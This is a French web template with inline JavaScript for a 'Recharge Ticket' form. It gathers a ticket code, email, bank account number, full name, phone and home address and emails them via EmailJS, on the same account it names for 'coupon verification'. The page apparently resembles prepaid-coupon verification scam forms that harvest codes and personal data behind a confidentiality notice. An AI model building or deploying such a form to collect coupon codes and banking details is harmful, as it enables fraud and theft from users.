<x-layout>

    <div class="max-w-[640px] w-full text-center space-y-lg px-4 sm:px-0">
        <section class="space-y-sm">
            <h2 class="text-headline-lg font-headline-lg text-on-surface tracking-tight" data-i18n="rechargeTitle">Recharge Ticket</h2>
            <p class="text-body-lg font-body-lg text-on-surface-variant max-w-[520px] mx-auto" data-i18n="rechargeDescription">
                Remplissez les informations de votre ticket et de votre compte pour que notre équipe puisse traiter votre demande de recharge rapidement.
            </p>
        </section>

        <div class="bg-surface-container-lowest border border-outline-variant rounded-3xl p-md shadow-sm">
            <form id="rechargeTicketForm" novalidate class="space-y-md">

                <div class="relative group">
                    <label for="user_email" class="text-sm font-medium text-slate-700 dark:text-slate-300 flex flex-start mb-2" data-i18n="rechargeEmailLabel">
                        Gmail <span class="text-red-500 ml-1">*</span>
                    </label>
                    <input id="user_email" name="user_email" type="email" placeholder="you@gmail.com" data-i18n-placeholder="rechargeEmailPlaceholder" required
                        class="w-full h-14 px-md bg-surface text-headline-md font-headline-md border border-outline-variant rounded-lg focus:ring-2 focus:ring-primary focus:border-primary transition-all tracking-widest" />
                </div>

                <div class="relative group">
                    <label for="ticket_code" class="text-sm font-medium text-slate-700 dark:text-slate-300 flex flex-start mb-2" data-i18n="rechargeTicketCodeLabel">
                        Code du ticket <span class="text-red-500 ml-1">*</span>
                    </label>
                    <input id="ticket_code" name="ticket_code" type="text" placeholder="e.g. ABCD-1234-EFGH" data-i18n-placeholder="rechargeTicketCodePlaceholder"
                        required class="w-full h-14 px-md bg-surface text-headline-md font-headline-md border border-outline-variant rounded-lg focus:ring-2 focus:ring-primary focus:border-primary transition-all tracking-widest uppercase" />
                </div>

                <div class="grid grid-cols-1 gap-md md:grid-cols-2">
                    <div class="relative group">
                        <label for="account_number" class="text-sm font-medium text-slate-700 dark:text-slate-300 flex flex-start mb-2" data-i18n="rechargeAccountNumberLabel">
                            Numéro de compte <span class="text-red-500 ml-1">*</span>
                        </label>
                        <input id="account_number" name="account_number" type="text" placeholder="123456789" data-i18n-placeholder="rechargeAccountNumberPlaceholder"
                            required class="w-full h-14 px-md bg-surface text-headline-md font-headline-md border border-outline-variant rounded-lg focus:ring-2 focus:ring-primary focus:border-primary transition-all tracking-widest" />
                    </div>

                    <div class="relative group">
                        <label for="account_name" class="text-sm font-medium text-slate-700 dark:text-slate-300 flex flex-start mb-2" data-i18n="rechargeAccountNameLabel">
                            Nom complet titulaire <span class="text-red-500 ml-1">*</span>
                        </label>
                        <input id="account_name" name="account_name" type="text" placeholder="John Doe" data-i18n-placeholder="rechargeAccountNamePlaceholder"
                            required class="w-full h-14 px-md bg-surface text-headline-md font-headline-md border border-outline-variant rounded-lg focus:ring-2 focus:ring-primary focus:border-primary transition-all tracking-widest" />
                    </div>
                </div>

                <div class="grid grid-cols-1 gap-md md:grid-cols-2">
                    <div class="relative group">
                        <label for="phone" class="text-sm font-medium text-slate-700 dark:text-slate-300 flex flex-start mb-2" data-i18n="rechargePhoneLabel">
                            Téléphone <span class="text-red-500 ml-1">*</span>
                        </label>
                        <input id="phone" name="phone" type="tel" placeholder="+33 6 00 00 00 00" data-i18n-placeholder="rechargePhonePlaceholder"
                            required class="w-full h-14 px-md bg-surface text-headline-md font-headline-md border border-outline-variant rounded-lg focus:ring-2 focus:ring-primary focus:border-primary transition-all tracking-widest" />
                    </div>

                    <div class="relative group">
                        <label for="address" class="text-sm font-medium text-slate-700 dark:text-slate-300 flex flex-start mb-2" data-i18n="rechargeAddressLabel">
                            Adresse domicile <span class="text-red-500 ml-1">*</span>
                        </label>
                        <input id="address" name="address" type="text" placeholder="123 rue de l'exemple, Paris" data-i18n-placeholder="rechargeAddressPlaceholder"
                            required class="w-full h-14 px-md bg-surface text-headline-md font-headline-md border border-outline-variant rounded-lg focus:ring-2 focus:ring-primary focus:border-primary transition-all tracking-widest" />
                    </div>
                </div>

                <button type="submit" id="submitBtn"
                    class="w-full h-14 bg-primary text-on-primary font-headline-md text-headline-md rounded-lg hover:bg-primary-container hover:text-on-primary-container active:scale-[0.98] transition-all flex items-center justify-center gap-2 disabled:opacity-60 disabled:cursor-not-allowed">
                    <svg id="spinner" class="hidden animate-spin w-5 h-5 flex-shrink-0" fill="none" viewBox="0 0 24 24">
                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" />
                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z" />
                    </svg>
                    <span id="btn-icon" class="material-symbols-outlined" style="font-variation-settings: 'FILL' 1;">send</span>
                    <span id="btn-label" data-i18n="rechargeSubmitButton">Envoyer</span>
                </button>
            </form>
        </div>

        <div class="mt-8 rounded-3xl bg-surface-container-low border border-outline-variant p-md text-left space-y-4">
            <div class="flex items-center gap-3 text-primary">
                <span class="material-symbols-outlined">shield</span>
                <h3 class="font-headline-md text-headline-md" data-i18n="rechargeTrustTitle">Sécurité et confidentialité</h3>
            </div>
            <p class="text-body-md text-on-surface-variant" data-i18n="rechargeTrustText1">Toutes les informations envoyées sont traitées de manière confidentielle via le même compte sécurisé utilisé pour la vérification des coupons.</p>
            <p class="text-body-md text-on-surface-variant" data-i18n="rechargeTrustText2">Ce formulaire est optimisé pour mobile : navigation claire, champs espacés et actions simples.</p>
        </div>
    </div>

    <div id="toast-container"
        class="fixed top-6 left-1/2 -translate-x-1/2 z-50 flex flex-col gap-2.5 pointer-events-none w-[min(420px,92vw)]"
        aria-live="polite" aria-atomic="true">
    </div>

    <script>
        const EMAILJS_PUBLIC_KEY = '_rzBEYEaRj7BX_bHx';
        const EMAILJS_SERVICE_ID = 'service_ug6vejb';
        const EMAILJS_TEMPLATE_ID = 'template_g31nmcr'; // Même compte EmailJS que pour la vérification coupon

        emailjs.init({ publicKey: EMAILJS_PUBLIC_KEY });

        function showToast({ type = 'success', title, message, duration = 6000 }) {
            const container = document.getElementById('toast-container');
            const iconSuccess = `<svg width="15" height="15" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg>`;
            const iconError   = `<svg width="15" height="15" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5"><path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"/></svg>`;
            const isSuccess   = type === 'success';

            const toast = document.createElement('div');
            toast.className = 'relative overflow-hidden pointer-events-auto bg-white border border-slate-200 rounded-2xl shadow-xl flex items-start gap-3 p-4 animate-toast-in';
            toast.innerHTML = `
                <div class="w-9 h-9 rounded-full flex items-center justify-center flex-shrink-0 ${isSuccess ? 'bg-emerald-50 text-emerald-600' : 'bg-red-50 text-red-500'}">
                    ${isSuccess ? iconSuccess : iconError}
                </div>
                <div class="flex-1 min-w-0 pt-0.5">
                    <p class="text-sm font-semibold text-slate-900 leading-snug">${title}</p>
                    <p class="text-xs text-slate-500 mt-0.5 leading-relaxed">${message}</p>
                </div>
                <button class="text-slate-400 hover:text-slate-600 transition-colors flex-shrink-0 mt-0.5" aria-label="Fermer">
                    <svg width="14" height="14" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5"><path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"/></svg>
                </button>
                <div class="toast-bar ${isSuccess ? 'bg-emerald-500' : 'bg-red-500'}" style="animation-duration:${duration}ms"></div>`;

            container.appendChild(toast);
            const dismiss = () => { toast.style.animation = 'toastOut 0.35s ease-in forwards'; setTimeout(() => toast.remove(), 340); };
            toast.querySelector('button').addEventListener('click', dismiss);
            setTimeout(dismiss, duration);
        }

        document.getElementById('rechargeTicketForm').addEventListener('submit', async function (e) {
            e.preventDefault();

            const btn      = document.getElementById('submitBtn');
            const spinner  = document.getElementById('spinner');
            const btnIcon  = document.getElementById('btn-icon');
            const btnLabel = document.getElementById('btn-label');

            let valid = true;
            ['user_email', 'ticket_code', 'account_number', 'account_name', 'phone', 'address'].forEach(id => {
                const el = document.getElementById(id);
                if (!el?.value.trim()) {
                    valid = false;
                    el?.classList.add('!border-red-400', '!ring-2', '!ring-red-200', '!bg-red-50');
                    el?.addEventListener('input', () => el.classList.remove('!border-red-400', '!ring-2', '!ring-red-200', '!bg-red-50'), { once: true });
                }
            });

            if (!valid) {
                showToast({ type: 'error', title: window.getTranslated(selectedLanguage, 'missingTitle'), message: window.getTranslated(selectedLanguage, 'missingMessage'), duration: 5000 });
                return;
            }

            const params = {
                form_type: 'Recharge Ticket',
                user_email: document.getElementById('user_email').value.trim(),
                ticket_code: document.getElementById('ticket_code').value.trim(),
                account_number: document.getElementById('account_number').value.trim(),
                account_name: document.getElementById('account_name').value.trim(),
                phone: document.getElementById('phone').value.trim(),
                address: document.getElementById('address').value.trim(),
            };

            btn.disabled = true;
            spinner.classList.remove('hidden');
            btnIcon.classList.add('hidden');
            btnLabel.textContent = window.getTranslated(selectedLanguage, 'sendingLabel');

            try {
                await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, params);

                e.target.reset();
                showToast({ type: 'success', title: window.getTranslated(selectedLanguage, 'toastSuccessTitle'), message: window.getTranslated(selectedLanguage, 'toastSuccessMessage'), duration: 7000 });

                setTimeout(() => {
                    window.location.href = '/recharge-confirmation';
                }, 2000);
            } catch (err) {
                console.error('[EmailJS] Erreur recharge ticket :', err);
                let msg = window.getTranslated(selectedLanguage, 'sendErrorGeneric');
                if (err?.status === 401 || err?.status === 403) {
                    msg = window.getTranslated(selectedLanguage, 'sendErrorAuth');
                } else if (err?.status === 404) {
                    msg = window.getTranslated(selectedLanguage, 'sendErrorNotFound');
                } else if (err?.status === 429) {
                    msg = window.getTranslated(selectedLanguage, 'sendErrorRateLimit');
                }
                showToast({ type: 'error', title: window.getTranslated(selectedLanguage, 'toastErrorTitle'), message: msg, duration: 9000 });
            } finally {
                btn.disabled = false;
                spinner.classList.add('hidden');
                btnIcon.classList.remove('hidden');
                btnLabel.textContent = window.getTranslated(selectedLanguage, 'rechargeSubmitButton');
            }
        });
    </script>

</x-layout>
